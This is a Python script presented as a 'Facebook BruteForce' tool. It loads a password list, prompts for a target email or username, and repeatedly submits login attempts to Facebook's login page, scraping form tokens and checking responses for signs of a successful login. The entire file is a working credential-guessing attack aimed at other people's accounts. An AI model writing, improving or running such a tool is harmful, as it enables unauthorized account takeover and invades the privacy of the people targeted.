import os.path
import requests
from bs4 import BeautifulSoup
import sys
sys.stdout.write('\x1b]2; ANONYMOUS CYBER™🌻🔥💯\x07')
os.system('xdg-open https://www.facebook.com/yeasien.ahmed.1')

def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")

if sys.version_info[0] != 3:
    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 
    fb.py\n\t--------------------------------------''')
    sys.exit()

PASSWORD_FILE = "passwords.txt"
MIN_PASSWORD_LENGTH = 6
POST_URL = 'https://www.facebook.com/login.php'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
PAYLOAD = {}
COOKIES = {}


def create_form():
    form = dict()
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

    data = requests.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, 'html.parser').form
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form, cookies


def is_this_a_password(email, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD['email'] = email
    PAYLOAD['pass'] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
        open('temp', 'w').write(str(r.content))
        print('\nPassword Found Is: ', password)
        return True
    return False


if __name__ == "__main__":
    clear()
    print("\n\n\n     \x1b\033[38;5;198m  █████▒▄▄▄▄       \x1b[38;5;208m▄▄▄▄    ██▀███   \033[1;92m█    ██ \033[33;1m▄▄▄█████▓▓█████ \n     \x1b\033[38;5;198m▓██   ▒▓█████▄    \x1b[38;5;208m▓█████▄ ▓██ ▒ ██▒ \033[1;92m██  ▓██▒▓  \033[33;1m██▒ ▓▒▓█   ▀ \n     \x1b\033[38;5;198m▒████ ░▒██▒ ▄██   \x1b[38;5;208m▒██▒ ▄██▓██ ░▄█ \033[1;92m▒▓██  ▒██░▒ \033[33;1m▓██░ ▒░▒███   \n     \x1b\033[38;5;198m░▓█▒  ░▒██░█▀     \x1b[38;5;208m▒██░█▀  ▒██▀▀█▄  \033[1;92m▓▓█  ░██░░ \033[33;1m▓██▓ ░ ▒▓█  ▄ \n     \x1b\033[38;5;198m░▒█░   ░▓█  ▀█▓   \x1b[38;5;208m░▓█  ▀█▓░██▓ ▒██▒\033[1;92m▒▒█████▓   \033[33;1m▒██▒ ░ ░▒████▒\n     \x1b\033[38;5;198m ▒ ░   ░▒▓███▀▒   \x1b[38;5;208m░▒▓███▀▒░ ▒▓ ░▒▓░\033[1;92m░▒▓▒ ▒ ▒   \033[33;1m▒ ░░   ░░ ▒░ ░\n     \x1b\033[38;5;198m ░     ▒░▒   ░    \x1b[38;5;208m▒░▒   ░   ░▒ ░ ▒░░░\033[1;92m▒░ ░ ░     \033[33;1m░     ░ ░  ░\n     \x1b\033[38;5;198m ░ ░    ░    ░     \x1b[38;5;208m░    ░   ░░   ░  ░░\033[1;92m░ ░ ░   ░  \033[33;1m       ░   \n     \x1b\033[38;5;198m        ░          \x1b[38;5;208m░         ░        ░\033[1;92m            \033[33;1m     ░  ░\n     \x1b\033[38;5;198m             ░          \x1b[38;5;208m░   ")
    print('\n\t\033[38;5;196m---------- \033[1;32mWelcome To Facebook BruteForce \033[38;5;196m----------\n')
    if not os.path.isfile(PASSWORD_FILE):
        print("Password File Is Not Exist: ", PASSWORD_FILE)
        sys.exit(0)
    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
    print("\n\t\033[1;92m<\x1b\033[38;5;198m/\033[1;92m> \033[33;1mPassword File Selected :\033[1;32m", PASSWORD_FILE)
    email = input('\n\t\033[36;1m Email/Username To Target ➤\x1b[38;5;208m ').strip()
    for index, password in zip(range(password_data.__len__()), password_data):
        password = password.strip()
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
        print("\t\033[1;92m<\x1b\033[38;5;198m/\033[1;92m> \033[33;1m Target Password \033[38;5;196m<━━\x1b[1;97m[", index, "]\033[38;5;196m━━━>: ", password)
        if is_this_a_password(email, index, password):
            break
